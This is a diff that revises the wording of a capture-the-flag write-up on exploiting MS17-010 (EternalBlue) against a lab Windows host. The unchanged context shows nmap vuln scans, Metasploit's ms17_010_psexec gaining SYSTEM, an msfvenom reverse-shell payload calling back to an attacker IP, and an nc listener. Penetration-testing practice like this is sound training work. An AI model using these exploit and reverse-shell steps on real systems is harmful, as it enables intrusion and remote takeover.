@@ -16,7 +16,7 @@ sudo $(which autorecon) 10.10.10.4
 
 ### Nmap
 
-From Nmap results returned from AutoRecon we see the following ports open.
+Nmap results, returned from AutoRecon, show the following ports open.
 
 ```
 PORT    STATE SERVICE      REASON          VERSION
@@ -33,7 +33,7 @@ PORT    STATE SERVICE      REASON          VERSION
 |_    10.10.10.4
 ```
 
-A deeper investigation on the open ports shows that the target may be vulnerable to `MS08-067` and `MS17-010`.
+A deeper investigation on the open the main ports, shows that the target may be vulnerable to `MS08-067` and `MS17-010`.
 
 ```
 $ sudo nmap -p 139,445 --script vuln 10.10.10.4
@@ -108,7 +108,7 @@ Matching Modules
    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
 ```
 
-After testing a few of the exploits, the `ms17_010_psexec` worked.
+After testing a few of the exploits, the `ms17_010_psexec` worked. Let me show the steps.
 
 ```
 msf6 > use exploit/windows/smb/ms17_010_psexec
@@ -172,7 +172,7 @@ RHOSTS => 10.10.10.4
 ```
 
 
-Now the options are ok.
+Now the options seem to be good.
 
 ```
 msf6 exploit(windows/smb/ms17_010_psexec) > options
@@ -261,11 +261,11 @@ Server username: NT AUTHORITY\SYSTEM
 
 ### Manually
 
-There are many scripts around to exploit MS17-010. However many of them are old and only run on python2.7. After some search I found the folloowing repositorie with an adaptation for python3.
+There are many scripts around to exploit MS17-010. However, most of them only run on python2.7. After some search, I found the following GitHub repo with an adaptation for python3.
 
 [Python3 MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
 
-Basicaly we need 2 files of the repo:
+Basically we need 2 files from the repo:
 - mysmb.py
 - zzz_exploit.py
 
@@ -275,7 +275,7 @@ But the easiest step is to clone the whole repo.
 $ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
 ```
 
-We will need a shell code to send to the target and execute to get a reverse shell.
+We will need to send to the target a shell code. Let's use `msfvenom` to generate it.
 
 ```
 $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe -o ms17-010.exe
@@ -287,7 +287,7 @@ Final size of exe file: 73802 bytes
 Saved as: ms17-010.exe
 ```
 
-We will edit the `zzz_exploit.py` to include some instructions to upload our payload to the target.
+We will edit the `zzz_exploit.py` file to include some instructions to upload our payload to the target.
 
 ```
 ...
@@ -302,7 +302,7 @@ def do_system_mysmb_session(conn, pipe_name, share, mode):
     print('done.')
     # <<<<<>>>>>
 
-    print("[*] have fun with the system smb session! :-)")
+    print("[*] have fun with the system smb session!")
 ...
 ```
 
@@ -313,7 +313,7 @@ $ nc -nlvp 4444
 listening on [any] 4444 ...
 ```
 
-When executing our script, it will upload our file and open a fragile shell on the target. But as soon as we run our payload, it will connect to our listner.
+When executing our script, it will upload our file and open a fragile shell on the target. But as soon as we run our payload, it will connect to our listner and we will have a more consistent shell.
 
 ```
 $ python zzz_exploit.py 10.10.10.4                      
